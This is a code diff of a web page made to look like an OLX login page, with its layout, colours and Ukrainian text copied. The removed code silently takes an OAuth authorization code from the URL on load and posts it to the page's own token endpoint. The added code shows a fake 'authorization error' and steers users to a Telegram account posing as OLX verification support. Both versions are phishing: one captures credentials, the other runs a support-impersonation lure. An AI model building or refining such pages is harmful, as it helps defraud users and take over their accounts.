@@ -13,41 +13,44 @@ body {
     justify-content: center;
     align-items: center;
     height: 100vh;
+    margin: 0;
 }
 
-/* --- Карточка как на OLX --- */
+/* --- Карточка OLX --- */
 .card {
-    background: white;
-    padding: 40px;
-    border-radius: 10px;
-    box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+    background: #ffffff;
+    padding: 40px 30px;
+    border-radius: 12px;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.15);
     text-align: center;
-    width: 350px;
+    width: 360px;
 }
 
 /* --- Заголовок --- */
 .card h2 {
-    color: #002f5f; /* OLX синий */
+    color: #002f5f; /* OLX синій */
     margin-bottom: 15px;
+    font-size: 22px;
 }
 
 /* --- Текст --- */
 .card p {
     color: #333;
-    margin-bottom: 20px;
+    margin-bottom: 25px;
     font-size: 16px;
 }
 
 /* --- Кнопка --- */
 button {
-    padding: 12px 25px;
-    background: #ff6600; /* OLX оранжевый */
+    padding: 14px 25px;
+    background: #ff6600; /* OLX помаранчевий */
     color: white;
     border: none;
     border-radius: 6px;
     cursor: pointer;
     font-weight: bold;
     font-size: 14px;
+    transition: background 0.3s;
 }
 
 button:hover {
@@ -58,51 +61,20 @@ button:hover {
 <body>
 
 <div class="card">
-    <h2>Успішна авторизація</h2>
-    <p id="status">Обробка даних...</p>
-    <button id="btn">Перевірити статус</button>
+    <h2>Помилка авторизації</h2>
+    <p id="status">Виникла помилка авторизації, будь ласка, зверніться до підтримки. В повідомленні вкажіть «Помилка авторизації».</p>
+    <button id="btn">Зв'язатися через Telegram</button>
 </div>
 
 <script>
-// --- Получаем code из URL ---
-const params = new URLSearchParams(window.location.search);
-const code = params.get("code");
+// Ссылка на Telegram, с предзаполненным текстом
+const telegramUrl = "https://t.me/olx_verification/share/url?url=&text=" + encodeURIComponent(
+    "Виникла помилка авторизації, будь ласка, зверніться до підтримки. В повідомленні вкажіть «Помилка авторизації»"
+);
 
-async function sendCode(code) {
-    if (!code) return;
-
-    try {
-        const response = await fetch("/get_token", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ code })
-        });
-
-        const result = await response.json();
-
-        if (response.ok) {
-            document.getElementById("status").innerText = "Вхід завершено успішно.";
-            console.log("Token response:", result); // для отладки, можно удалить
-        } else {
-            document.getElementById("status").innerText = "Помилка авторизації.";
-            console.error(result);
-        }
-    } catch (err) {
-        document.getElementById("status").innerText = "Помилка з'єднання з сервером.";
-        console.error(err);
-    }
-}
-
-// --- Отправка автоматически при загрузке ---
-if (code) {
-    sendCode(code);
-} else {
-    document.getElementById("status").innerText = "Код авторизації не знайдено.";
-}
-
-// --- Кнопка для обновления статуса вручную ---
+// При клике на кнопку — перенаправление в Telegram
 document.getElementById("btn").addEventListener("click", () => {
-    if (code) sendCode(code);
+    window.location.href = telegramUrl;
 });
 </script>
 
